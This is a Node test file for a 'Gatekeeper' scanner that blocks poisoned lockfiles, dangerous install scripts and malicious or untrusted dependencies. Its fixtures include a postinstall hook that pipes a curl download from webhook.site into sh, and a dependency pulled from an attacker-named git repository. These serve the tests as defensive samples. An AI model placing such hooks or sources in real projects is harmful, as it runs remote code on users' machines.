// Gatekeeper Security Preflight & Audit Tests
import test from 'node:test';
import assert from 'node:assert/strict';
import { DatabaseSync } from 'node:sqlite';
import {
  scanSecurity,
  recordSecurityScan,
  getLatestSecurityScan,
  VERDICTS,
} from '../server/gatekeeper.js';

function createMockDb() {
  const db = new DatabaseSync(':memory:');
  db.exec(`
    CREATE TABLE projects (id INTEGER PRIMARY KEY, name TEXT, app_url TEXT);
    INSERT INTO projects VALUES (1, 'Secure Project', 'http://127.0.0.1:4100/');
    CREATE TABLE security_scans (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      project_id INTEGER NOT NULL REFERENCES projects(id) ON DELETE CASCADE,
      commit_sha TEXT,
      verdict TEXT NOT NULL,
      summary TEXT NOT NULL,
      findings_json TEXT NOT NULL DEFAULT '[]',
      package_count INTEGER NOT NULL DEFAULT 0,
      created_at TEXT NOT NULL
    );
  `);
  return {
    raw: db,
    get: (sql, ...p) => db.prepare(sql).get(...p),
    all: (sql, ...p) => db.prepare(sql).all(...p),
    run: (sql, ...p) => db.prepare(sql).run(...p),
  };
}

test('Gatekeeper: clean lockfile returns ALLOWED verdict', () => {
  const cleanLock = {
    packages: {
      'node_modules/express': {
        name: 'express',
        version: '4.21.2',
        resolved: 'https://registry.npmjs.org/express/-/express-4.21.2.tgz',
        integrity: 'sha512-zZBc...',
      },
    },
  };
  const manifest = {
    name: 'safe-app',
    dependencies: { express: '^4.21.2' },
  };

  const scan = scanSecurity({
    lockfileContent: cleanLock,
    manifestContent: manifest,
  });

  assert.equal(scan.verdict, VERDICTS.ALLOWED);
  assert.equal(scan.findings.length, 0);
  assert.match(scan.summary, /preflight passed/i);
});

test('Gatekeeper: detects poisoned lockfile (tarball name mismatch) and blocks execution', () => {
  const poisonedLock = {
    packages: {
      'node_modules/express': {
        name: 'express',
        version: '4.21.2',
        resolved: 'https://registry.npmjs.org/express/-/backdoor-payload-1.0.0.tgz',
        integrity: 'sha512-xyz...',
      },
    },
  };

  const scan = scanSecurity({ lockfileContent: poisonedLock });
  assert.equal(scan.verdict, VERDICTS.BLOCKED);
  assert.ok(scan.findings.some((f) => f.kind === 'poisoned_lockfile_entry'));
});

test('Gatekeeper: detects suspicious install lifecycle scripts', () => {
  const maliciousManifest = {
    name: 'trojan-pkg',
    scripts: {
      postinstall: 'curl -s https://webhook.site/test-token | sh',
    },
  };

  const scan = scanSecurity({ manifestContent: maliciousManifest });
  assert.equal(scan.verdict, VERDICTS.BLOCKED);
  assert.ok(scan.findings.some((f) => f.kind === 'dangerous_lifecycle_script'));
});

test('Gatekeeper: detects known malicious packages and untrusted registry sources', () => {
  const untrustedManifest = {
    name: 'test-project',
    dependencies: {
      'tailwindcss-visual-kit': '^1.3.7',
      'untrusted-lib': 'git+https://github.com/attacker/malware.git',
    },
  };

  const scan = scanSecurity({ manifestContent: untrustedManifest });
  assert.equal(scan.verdict, VERDICTS.BLOCKED);
  assert.ok(scan.findings.some((f) => f.kind === 'known_malicious_dependency'));
  assert.ok(scan.findings.some((f) => f.kind === 'untrusted_dependency_source'));
});

test('Gatekeeper: records scan findings and persists history into database', () => {
  const db = createMockDb();
  const scan = scanSecurity({
    manifestContent: {
      name: 'demo-scan',
      dependencies: { express: '^4.21.2' },
    },
    commitSha: '91032ad',
  });

  const scanId = recordSecurityScan(db, 1, scan);
  assert.ok(scanId > 0);

  const latest = getLatestSecurityScan(db, 1);
  assert.equal(latest.id, scanId);
  assert.equal(latest.commitSha, '91032ad');
  assert.equal(latest.verdict, VERDICTS.ALLOWED);
  assert.equal(latest.packageCount, 1);
});

